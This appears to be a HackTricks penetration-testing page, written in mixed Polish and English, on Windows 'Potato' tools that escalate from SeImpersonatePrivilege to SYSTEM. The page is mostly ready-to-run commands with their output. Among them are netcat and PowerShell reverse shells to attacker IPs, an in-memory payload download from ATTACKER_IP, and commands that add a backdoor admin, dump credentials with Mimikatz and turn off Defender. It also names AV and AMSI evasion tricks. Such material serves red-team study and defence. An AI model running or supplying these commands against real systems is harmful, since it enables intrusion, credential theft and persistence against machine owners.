# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato nie działa** na Windows Server 2019 i Windows 10 build 1809 i nowszych. Jednak [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** mogą być użyte do wykorzystania tych samych uprawnień i uzyskania dostępu na poziomie `NT AUTHORITY\SYSTEM`. Ten [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) omawia narzędzie `PrintSpoofer` szczegółowo — można go użyć do nadużywania impersonation privileges na Windows 10 i Server 2019 hostach, gdzie JuicyPotato już nie działa.

> [!TIP]
> A modern alternative frequently maintained in 2024–2025 is SigmaPotato (a fork of GodPotato) which adds in-memory/.NET reflection usage and extended OS support. See quick usage below and the repo in References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requirements and common gotchas

All the following techniques rely on abusing an impersonation-capable privileged service from a context holding either of these privileges:

- SeImpersonatePrivilege (najczęstsze) or SeAssignPrimaryTokenPrivilege
- High integrity is not required if the token already has SeImpersonatePrivilege (typical for many service accounts such as IIS AppPool, MSSQL, etc.)

Check privileges quickly:
```cmd
whoami /priv | findstr /i impersonate
```
Operational notes:

- Jeśli twoja powłoka działa pod ograniczonym tokenem bez SeImpersonatePrivilege (co jest częste dla Local Service/Network Service w niektórych kontekstach), odzyskaj domyślne uprawnienia konta używając FullPowers, a następnie uruchom Potato. Przykład: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer wymaga, aby usługa Print Spooler była uruchomiona i dostępna przez lokalny RPC endpoint (spoolss). W zahartowanych środowiskach, gdzie Spooler jest wyłączony po PrintNightmare, preferuj RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato wymaga, aby OXID resolver był osiągalny na TCP/135. Jeśli egress jest zablokowany, użyj redirector/port-forwarder (see example below). Starsze buildy wymagały flagi -f.
- EfsPotato/SharpEfsPotato abuse MS-EFSR; jeśli jeden pipe jest zablokowany, spróbuj alternatywnych pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Error 0x6d3 podczas RpcBindingSetAuthInfo zwykle wskazuje na nieznaną/nieobsługiwaną usługę uwierzytelniania RPC; spróbuj innego pipe/transport lub upewnij się, że docelowa usługa jest uruchomiona.
- „Kitchen-sink” forks takie jak DeadPotato dołączają dodatkowe moduły payload (Mimikatz/SharpHound/Defender off), które dotykają dysku; spodziewaj się wyższej detekcji przez EDR w porównaniu do slim originals.

## Szybkie demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Uwagi:
- Możesz użyć -i, aby uruchomić interaktywny proces w bieżącej konsoli, lub -c, aby wykonać polecenie jednolinijkowe.
- Wymaga usługi Spooler. Jeśli jest wyłączona, operacja się nie powiedzie.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Jeśli ruch wychodzący na porcie 135 jest zablokowany, pivotuj OXID resolver przez socat na swoim redirectorze:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato jest nowszą COM abuse primitive wydaną pod koniec 2022, która atakuje usługę **PrintNotify** zamiast Spooler/BITS. Program instancjonuje PrintNotify COM server, podmienia fałszywy `IUnknown`, a następnie wywołuje uprzywilejowane callback przez `CreatePointerMoniker`. Gdy usługa PrintNotify (działająca jako **SYSTEM**) łączy się z powrotem, proces duplikuje zwrócony token i uruchamia dostarczony payload z pełnymi uprawnieniami.

Key operational notes:

* Works on Windows 10/11 and Windows Server 2012–2022 as long as the Print Workflow/PrintNotify service is installed (it is present even when the legacy Spooler is disabled post-PrintNightmare).
* Requires the calling context to hold **SeImpersonatePrivilege** (typical for IIS APPPOOL, MSSQL, and scheduled-task service accounts).
* Accepts either a direct command or an interactive mode so you can stay inside the original console. Example:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Because it is purely COM-based, no named-pipe listeners or external redirectors are required, making it a drop-in replacement on hosts where Defender blocks RoguePotato’s RPC binding.

Operators such as Ink Dragon fire PrintNotifyPotato immediately after gaining ViewState RCE on SharePoint to pivot from the `w3wp.exe` worker to SYSTEM before installing ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Porada: Jeśli jeden pipe zawiedzie lub EDR go zablokuje, spróbuj użyć innych obsługiwanych pipe'ów:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notatki:
- Działa na Windows 8/8.1–11 oraz Server 2012–2022, gdy dostępne jest uprawnienie SeImpersonatePrivilege.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato udostępnia dwa warianty skierowane do obiektów DCOM usług, które domyślnie mają ustawiony RPC_C_IMP_LEVEL_IMPERSONATE. Skompiluj lub użyj dostarczonych binaries i uruchom swoje polecenie:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (zaktualizowany fork GodPotato)

SigmaPotato dodaje nowoczesne udogodnienia, takie jak in-memory execution za pomocą .NET reflection oraz PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- Wbudowany przełącznik reverse shell `--revshell` oraz usunięcie ograniczenia 1024 znaków w PowerShell, dzięki czemu możesz uruchomić długie AMSI-bypassing payloads za jednym razem.
- Reflection-friendly syntax (`[SigmaPotato]::Main()`), oraz prosta sztuczka AV evasion przez `VirtualAllocExNuma()`, żeby zmylić proste heurystyki.
- Osobny `SigmaPotatoCore.exe` skompilowany przeciwko .NET 2.0 dla środowisk PowerShell Core.

### DeadPotato (2024 GodPotato rework with modules)

DeadPotato zachowuje łańcuch impersonacji GodPotato OXID/DCOM, ale dodaje post-exploitation helpers, dzięki czemu operatorzy mogą natychmiast take SYSTEM i prowadzić persistence/collection bez dodatkowego tooling.

Typowe moduły (wszystkie wymagają SeImpersonatePrivilege):

- `-cmd "<cmd>"` — uruchomić dowolne polecenie jako SYSTEM.
- `-rev <ip:port>` — szybki reverse shell.
- `-newadmin user:pass` — utworzyć lokalne konto administratora do persistence.
- `-mimi sam|lsa|all` — zrzucić i uruchomić Mimikatz w celu dump credentials (zapisuje na dysku, noisy).
- `-sharphound` — uruchomić SharpHound collection jako SYSTEM.
- `-defender off` — wyłączyć Defender real-time protection (very noisy).

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Ponieważ dostarcza dodatkowe pliki binarne, spodziewaj się większej liczby wykryć przez AV/EDR; użyj lżejszego GodPotato/SigmaPotato, gdy stealth ma znaczenie.

## References

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
